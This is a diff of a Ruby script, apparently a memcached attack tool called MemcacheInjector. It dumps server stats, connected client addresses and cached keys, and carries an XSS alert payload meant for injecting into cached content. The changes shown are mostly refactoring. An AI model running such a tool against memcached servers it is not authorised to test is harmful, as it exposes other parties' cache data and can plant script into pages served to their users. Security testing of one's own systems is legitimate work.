@@ -77,6 +77,7 @@ class MemcacheInjector
     }.merge(opts)
     @mode    = mode
     @payload = payload
+    @conns   = Array.new
     @slabs   = Array.new
     @keys    = Array.new
   end
@@ -97,20 +98,27 @@ class MemcacheInjector
   end
 
   def get_active_connections
-    get_stats_of_type(:conns)
+    conns = get_stats_of_type(:conns)
+    @conns << conns
+    conns
   end
 
   def get_slab_info
-    get_stats_of_type(:slabs)
+    slabs = get_stats_of_type(:slabs)
+    @slabs << slabs
+    slabs
   end
 
   def dump_keys_from_slab(i)
     items = @socket.send_and_expect_list("stats cachedump #{i} #{@opts[:keys_per_slab]}", :item)
+    keys = []
 
-    items.inject([]) do |collection, item|
-      item_full = item.split('ITEM ')[0]
-      collection << item_full.split(' ')[0]
+    items.each do |item|
+      keys << item.split('ITEM ')[0].split(' ')[0]
     end
+
+    @keys << keys
+    keys
   end
 
   private
@@ -140,26 +148,28 @@ class MemcacheInjector
 end
 
 client = MemcacheInjector.new(ARGV[0], ARGV[1], :dump, "<script>alert('memcache_injector');</script>")
-slabs  = []
+slabs  = Array.new
 
-puts "Starting MemcacheInjector...\r\n\r\n"
+puts "\r\n"
+puts "Starting MemcacheInjector..."
+puts "\r\n"
 
 puts "General Stats"
-puts "-------------\r\n\r\n"
+puts "-------------"
 
 client.get_general_stats.each do |stat, val|
   puts "#{stat}: #{val}"
 end
 
 puts "\r\nActive Connections"
-puts "------------------\r\n\r\n"
+puts "------------------"
 
 client.get_active_connections.each do |i, stat|
   puts "#{stat['addr']} in #{stat['state']} state for #{stat['secs_since_last_cmd']}s"
 end
 
-puts "\r\nSlab Stats\r\n"
-puts "----------\r\n\r\n"
+puts "\r\nSlab Stats"
+puts "----------"
 
 client.get_slab_info.each do |i, stat|
   slabs << i
@@ -167,13 +177,14 @@ client.get_slab_info.each do |i, stat|
   puts "##{i}: #{stat['used_chunks']}/#{stat['total_chunks']} chunks (allocated #{memory}B)"
 end
 
-puts "\r\nDump Tool\r\n"
-puts "---------\r\n\r\n"
+puts "\r\nDump Tool"
+puts "---------"
 
 slabs.each do |i|
-  puts "Starting dump of keys in slab ##{i}...\r\n\r\n"
-
-  client.dump_keys_from_slab(i).each do |item|
-    puts "* #{item}"
-  end
+  print "Starting dump of keys in slab ##{i}..."
+  dump = client.dump_keys_from_slab(i)
+  puts " Got #{dump.count} key(s)."
 end
+
+puts ""
+puts "Finished running MemcacheInjector."
